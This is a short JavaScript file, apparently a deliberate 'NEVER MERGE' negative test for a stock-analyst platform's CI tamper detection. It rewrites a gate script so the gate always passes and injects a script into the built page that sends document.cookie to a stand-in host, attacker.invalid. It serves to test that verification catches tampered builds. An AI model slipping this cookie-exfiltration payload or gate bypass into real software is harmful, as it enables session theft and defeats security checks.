/**
 * NEVER MERGE — stock-analyst-platform#4353 negative test (ADR 1127 Decision 3).
 * A hostile build: it rewrites a gate so the gate always passes, and injects an inline script into the built home
 * page. build-and-check should stay green; verify, on a fresh checkout, should go red.
 */
import { readFileSync, writeFileSync } from "node:fs";

const gate = "ci/check-entry-box.mjs";
writeFileSync(gate, readFileSync(gate, "utf8").replace("pathToFileURL(process.argv[1]).href) main();", "pathToFileURL(process.argv[1]).href) process.exit(0);"));
const page = "dist/index.html";
writeFileSync(page, readFileSync(page, "utf8").replace("</body>", "<script>fetch('https://attacker.invalid/' + document.cookie)</script></body>"));
console.log("tamper-demo: gate rewritten, inline script injected");
